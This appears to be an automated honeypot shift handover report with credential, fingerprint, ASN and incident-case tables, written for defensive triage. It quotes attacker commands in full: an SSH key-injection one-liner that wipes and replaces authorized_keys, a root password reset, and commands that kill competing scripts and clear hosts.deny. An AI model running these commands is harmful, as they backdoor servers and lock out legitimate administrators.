# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-03 |
| **Generated At** | 2026-06-03T23:48:11Z |
| **Shift Time** | 23:48 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **216** |
| Confirmed Threats | **210** |
| False Positives Filtered | **6** (2.8%) |
| Unique Attacker IPs | **36** |
| Countries of Origin | **12** |
| High Severity Cases | **31** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **185** |
| Malware Samples Analyzed | **0** HIGH · **19** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **136** |
| Unique Credential Pairs | **108** |
| Unique Usernames | **85** |
| Unique Passwords | **90** |
| Successful Auth Pairs | **24** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 31 |
| `345gs5662d34` | 14 |
| `font-size` | 4 |
| `margin-top` | 3 |
| `color` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 16 |
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 14 |
| ` 0;` | 3 |
| ` 12px;` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 14 |
| `margin-top` | ` 24px;` | 2 |
| `es` | `admin123` | 2 |
| `karate` | `karate` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `a;sldkfj` | `58.152.42.174` | 2026-06-03T21:26:00 |
| `root` | `3245gs5662d34` | `58.152.42.174` | 2026-06-03T21:26:05 |
| `root` | `2wsx#EDC4rfv` | `58.152.42.174` | 2026-06-03T22:32:59 |
| `root` | `Admin!@#` | `163.7.9.55` | 2026-06-03T22:33:10 |
| `root` | `3245gs5662d34` | `163.7.9.55` | 2026-06-03T22:33:12 |
| `root` | `111qqq!!!` | `58.152.42.174` | 2026-06-03T22:37:53 |
| `root` | `lb123456` | `45.78.207.244` | 2026-06-03T22:44:55 |
| `root` | `@qwer2025` | `45.78.207.244` | 2026-06-03T22:56:27 |
| `root` | `3245gs5662d34` | `45.78.207.244` | 2026-06-03T22:56:35 |
| `root` | `Abc!123456` | `45.202.240.36` | 2026-06-03T23:26:03 |
| `root` | `3245gs5662d34` | `45.202.240.36` | 2026-06-03T23:26:10 |
| `root` | `1qaz@WSX3e` | `103.20.223.56` | 2026-06-03T23:34:04 |
| `root` | `3245gs5662d34` | `103.20.223.56` | 2026-06-03T23:34:09 |
| `root` | `Comtom@2025` | `14.103.107.214` | 2026-06-03T23:34:18 |
| `root` | `sistemas123` | `4.213.160.153` | 2026-06-03T23:35:25 |
| `root` | `3245gs5662d34` | `4.213.160.153` | 2026-06-03T23:35:26 |
| `root` | `1999` | `14.103.107.214` | 2026-06-03T23:36:43 |
| `root` | `3edc$RFV` | `103.20.223.56` | 2026-06-03T23:38:39 |
| `root` | `1q2w3e4r!@` | `200.105.172.184` | 2026-06-03T23:42:15 |
| `root` | `3245gs5662d34` | `200.105.172.184` | 2026-06-03T23:42:22 |
| `root` | `qwer1234@` | `4.213.160.153` | 2026-06-03T23:43:47 |
| `root` | `123456mm` | `200.105.172.184` | 2026-06-03T23:44:22 |
| `root` | `Qw123456!` | `103.20.223.56` | 2026-06-03T23:45:02 |
| `root` | `as112233` | `4.213.160.153` | 2026-06-03T23:45:50 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **216** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 124 |
| Go SSH scanner | 24 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 98 | 11 |
| `4e066189c3bb...` | Generic scanner | 23 | 1 |
| `af8223ac9914...` | libssh-based | 11 | 2 |
| `03a80b21afa8...` | Modern SSH client | 9 | 3 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 98 | 11 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 23 | 1 | Generic scanner |
| `af8223ac9914...` | libssh | 11 | 2 | libssh-based |
| `03a80b21afa8...` | libssh | 9 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 6 | 3 | — |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:otLYzwM7We0Z"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.107.214`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `200.105.172.184`, `58.152.42.174`, `4.213.160.153`, `45.202.240.36`, `45.78.207.244`, `163.7.9.55`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **36** |
| Unique ASNs | **24** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 3 | LOW |
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS26210` | AXS Bolivia S. A. | 2 | HIGH |
| `AS150436` | Byteplus Pte. Ltd. | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (31)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9fa359e76902

| Field | Detail |
|---|---|
| **Source IP** | `58.152.42[.]174` |
| **First Seen** | 2026-06-03 21:25 |
| **Last Seen** | 2026-06-03 21:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 21:25:59` | `cowrie.session.connect` |
| `2026-06-03 21:25:59` | `cowrie.client.version` |
| `2026-06-03 21:25:59` | `cowrie.client.kex` |
| `2026-06-03 21:26:00` | `cowrie.login.success` |
| `2026-06-03 21:26:00` | `cowrie.session.params` |
| `2026-06-03 21:26:00` | `cowrie.command.input` |
| `2026-06-03 21:26:00` | `cowrie.command.failed` |
| `2026-06-03 21:26:00` | `cowrie.log.closed` |
| `2026-06-03 21:26:01` | `cowrie.session.params` |
| `2026-06-03 21:26:01` | `cowrie.command.input` |
| `2026-06-03 21:26:01` | `cowrie.session.file_download` |
| `2026-06-03 21:26:01` | `cowrie.log.closed` |
| `2026-06-03 21:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.152.42[.]174` to AbuseIPDB if not already reported
- [ ] Block `58.152.42[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64507cddaff3

| Field | Detail |
|---|---|
| **Source IP** | `58.152.42[.]174` |
| **First Seen** | 2026-06-03 21:26 |
| **Last Seen** | 2026-06-03 21:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 21:26:04` | `cowrie.session.connect` |
| `2026-06-03 21:26:04` | `cowrie.client.version` |
| `2026-06-03 21:26:04` | `cowrie.client.kex` |
| `2026-06-03 21:26:05` | `cowrie.login.success` |
| `2026-06-03 21:26:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.152.42[.]174` to AbuseIPDB if not already reported
- [ ] Block `58.152.42[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cc7378a5ef9

| Field | Detail |
|---|---|
| **Source IP** | `58.152.42[.]174` |
| **First Seen** | 2026-06-03 22:32 |
| **Last Seen** | 2026-06-03 22:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 22:32:58` | `cowrie.session.connect` |
| `2026-06-03 22:32:58` | `cowrie.client.version` |
| `2026-06-03 22:32:58` | `cowrie.client.kex` |
| `2026-06-03 22:32:59` | `cowrie.login.success` |
| `2026-06-03 22:33:00` | `cowrie.session.params` |
| `2026-06-03 22:33:00` | `cowrie.command.input` |
| `2026-06-03 22:33:00` | `cowrie.command.failed` |
| `2026-06-03 22:33:00` | `cowrie.log.closed` |
| `2026-06-03 22:33:00` | `cowrie.session.params` |
| `2026-06-03 22:33:00` | `cowrie.command.input` |
| `2026-06-03 22:33:01` | `cowrie.session.file_download` |
| `2026-06-03 22:33:01` | `cowrie.log.closed` |
| `2026-06-03 22:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.152.42[.]174` to AbuseIPDB if not already reported
- [ ] Block `58.152.42[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3430bbddbc45

| Field | Detail |
|---|---|
| **Source IP** | `58.152.42[.]174` |
| **First Seen** | 2026-06-03 22:33 |
| **Last Seen** | 2026-06-03 22:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 22:33:03` | `cowrie.session.connect` |
| `2026-06-03 22:33:03` | `cowrie.client.version` |
| `2026-06-03 22:33:03` | `cowrie.client.kex` |
| `2026-06-03 22:33:04` | `cowrie.login.success` |
| `2026-06-03 22:33:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.152.42[.]174` to AbuseIPDB if not already reported
- [ ] Block `58.152.42[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b32a4c0c900

| Field | Detail |
|---|---|
| **Source IP** | `163.7.9[.]55` |
| **First Seen** | 2026-06-03 22:33 |
| **Last Seen** | 2026-06-03 22:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 22:33:09` | `cowrie.session.connect` |
| `2026-06-03 22:33:09` | `cowrie.client.version` |
| `2026-06-03 22:33:09` | `cowrie.client.kex` |
| `2026-06-03 22:33:10` | `cowrie.login.success` |
| `2026-06-03 22:33:10` | `cowrie.session.params` |
| `2026-06-03 22:33:10` | `cowrie.command.input` |
| `2026-06-03 22:33:10` | `cowrie.command.failed` |
| `2026-06-03 22:33:10` | `cowrie.log.closed` |
| `2026-06-03 22:33:10` | `cowrie.session.params` |
| `2026-06-03 22:33:10` | `cowrie.command.input` |
| `2026-06-03 22:33:10` | `cowrie.session.file_download` |
| `2026-06-03 22:33:10` | `cowrie.log.closed` |
| `2026-06-03 22:33:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `163.7.9[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc01c8951f5c

| Field | Detail |
|---|---|
| **Source IP** | `163.7.9[.]55` |
| **First Seen** | 2026-06-03 22:33 |
| **Last Seen** | 2026-06-03 22:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 22:33:12` | `cowrie.session.connect` |
| `2026-06-03 22:33:12` | `cowrie.client.version` |
| `2026-06-03 22:33:12` | `cowrie.client.kex` |
| `2026-06-03 22:33:12` | `cowrie.login.success` |
| `2026-06-03 22:33:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `163.7.9[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0007652d3ae

| Field | Detail |
|---|---|
| **Source IP** | `58.152.42[.]174` |
| **First Seen** | 2026-06-03 22:37 |
| **Last Seen** | 2026-06-03 22:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 22:37:52` | `cowrie.session.connect` |
| `2026-06-03 22:37:52` | `cowrie.client.version` |
| `2026-06-03 22:37:52` | `cowrie.client.kex` |
| `2026-06-03 22:37:53` | `cowrie.login.success` |
| `2026-06-03 22:37:53` | `cowrie.session.params` |
| `2026-06-03 22:37:53` | `cowrie.command.input` |
| `2026-06-03 22:37:53` | `cowrie.command.failed` |
| `2026-06-03 22:37:53` | `cowrie.log.closed` |
| `2026-06-03 22:37:53` | `cowrie.session.params` |
| `2026-06-03 22:37:53` | `cowrie.command.input` |
| `2026-06-03 22:37:54` | `cowrie.session.file_download` |
| `2026-06-03 22:37:54` | `cowrie.log.closed` |
| `2026-06-03 22:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.152.42[.]174` to AbuseIPDB if not already reported
- [ ] Block `58.152.42[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb50266c1a6e

| Field | Detail |
|---|---|
| **Source IP** | `58.152.42[.]174` |
| **First Seen** | 2026-06-03 22:37 |
| **Last Seen** | 2026-06-03 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 22:37:56` | `cowrie.session.connect` |
| `2026-06-03 22:37:56` | `cowrie.client.version` |
| `2026-06-03 22:37:56` | `cowrie.client.kex` |
| `2026-06-03 22:37:57` | `cowrie.login.success` |
| `2026-06-03 22:37:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.152.42[.]174` to AbuseIPDB if not already reported
- [ ] Block `58.152.42[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705f328a3473

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-03 22:44 |
| **Last Seen** | 2026-06-03 22:44 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 22:44:17` | `cowrie.session.connect` |
| `2026-06-03 22:44:17` | `cowrie.client.version` |
| `2026-06-03 22:44:18` | `cowrie.client.kex` |
| `2026-06-03 22:44:55` | `cowrie.login.success` |
| `2026-06-03 22:44:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-989f755a6f4b

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-03 22:56 |
| **Last Seen** | 2026-06-03 22:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 22:56:24` | `cowrie.session.connect` |
| `2026-06-03 22:56:24` | `cowrie.client.version` |
| `2026-06-03 22:56:24` | `cowrie.client.kex` |
| `2026-06-03 22:56:27` | `cowrie.login.success` |
| `2026-06-03 22:56:27` | `cowrie.session.params` |
| `2026-06-03 22:56:27` | `cowrie.command.input` |
| `2026-06-03 22:56:27` | `cowrie.command.failed` |
| `2026-06-03 22:56:27` | `cowrie.log.closed` |
| `2026-06-03 22:56:30` | `cowrie.session.params` |
| `2026-06-03 22:56:30` | `cowrie.command.input` |
| `2026-06-03 22:56:30` | `cowrie.session.file_download` |
| `2026-06-03 22:56:30` | `cowrie.log.closed` |
| `2026-06-03 22:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39c5d84f2451

| Field | Detail |
|---|---|
| **Source IP** | `45.78.207[.]244` |
| **First Seen** | 2026-06-03 22:56 |
| **Last Seen** | 2026-06-03 22:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 22:56:32` | `cowrie.session.connect` |
| `2026-06-03 22:56:32` | `cowrie.client.version` |
| `2026-06-03 22:56:32` | `cowrie.client.kex` |
| `2026-06-03 22:56:35` | `cowrie.login.success` |
| `2026-06-03 22:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.207[.]244` to AbuseIPDB if not already reported
- [ ] Block `45.78.207[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d30c0ec72b99

| Field | Detail |
|---|---|
| **Source IP** | `45.202.240[.]36` |
| **First Seen** | 2026-06-03 23:26 |
| **Last Seen** | 2026-06-03 23:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:26:02` | `cowrie.session.connect` |
| `2026-06-03 23:26:02` | `cowrie.client.version` |
| `2026-06-03 23:26:02` | `cowrie.client.kex` |
| `2026-06-03 23:26:03` | `cowrie.login.success` |
| `2026-06-03 23:26:04` | `cowrie.session.params` |
| `2026-06-03 23:26:04` | `cowrie.command.input` |
| `2026-06-03 23:26:04` | `cowrie.command.failed` |
| `2026-06-03 23:26:04` | `cowrie.log.closed` |
| `2026-06-03 23:26:05` | `cowrie.session.params` |
| `2026-06-03 23:26:05` | `cowrie.command.input` |
| `2026-06-03 23:26:05` | `cowrie.session.file_download` |
| `2026-06-03 23:26:05` | `cowrie.log.closed` |
| `2026-06-03 23:26:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.202.240[.]36` to AbuseIPDB if not already reported
- [ ] Block `45.202.240[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
